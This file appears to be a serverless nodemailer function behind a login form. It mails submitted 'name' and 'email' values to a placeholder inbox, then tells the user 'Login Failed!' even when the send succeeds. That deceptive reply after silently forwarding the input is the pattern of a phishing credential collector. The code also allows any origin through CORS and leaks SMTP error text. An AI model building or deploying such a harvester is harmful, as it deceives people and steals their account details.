const nodemailer = require('nodemailer');

exports.handler = async function (event) {
  if (event.httpMethod === 'OPTIONS') {
    // CORS preflight
    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
      },
      body: '',
    };
  }

  const { name, email } = JSON.parse(event.body);

  const transporter = nodemailer.createTransport({
        host: process.env.SMTP_HOST,
        port: process.env.SMTP_PORT,
        secure: process.env.SMTP_PORT == 465, // true for 465, false for other ports
        auth: {
            user: process.env.SMTP_USER,
            pass: process.env.SMTP_PASS,
         },
            
        debug: true, //
  });



  transporter.verify((error, success) => {
    if (error) {
        console.error("SMTP Server Verification Failed:", error);
    } else {
        console.log("SMTP Server is ready to send emails");
    }
  });


  const mailOptions = {
    from: process.env.SMTP_USER,
    to: "your-email",
    subject: `New Submission`,
    text: `

Name: ${name}
Email: ${email}
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
      },
      body: JSON.stringify({ message: 'Login Failed!' }),
    };
  } catch (err) {
    console.error(err);
    return {
      statusCode: 500,
      headers: {
        'Access-Control-Allow-Origin': '*',
      },
      body: JSON.stringify({ message: 'Failed to Login.', error: err.message }),
    };
  }
};
